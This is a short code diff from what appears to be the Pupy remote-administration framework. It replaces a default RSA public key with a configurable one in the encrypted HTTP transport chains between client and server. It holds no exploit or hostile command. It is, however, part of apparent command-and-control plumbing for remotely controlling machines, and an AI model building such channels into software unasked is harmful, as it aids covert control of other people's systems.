@@ -27,13 +27,13 @@ class TransportConf(Transport):
                 )
             self.server_transport = chain_transports(
                     PupyHTTPServer,
-                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
+                    RSA_AESClient.custom(pubkey=rsa_pub_key, rsa_key_size=4096, aes_size=256),
                 )
 
         else:
             self.client_transport = chain_transports(
                     PupyHTTPClient.custom(keep_alive=True),
-                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
+                    RSA_AESClient.custom(pubkey=rsa_pub_key, rsa_key_size=4096, aes_size=256),
                 )
             self.server_transport = chain_transports(
                     PupyHTTPServer,
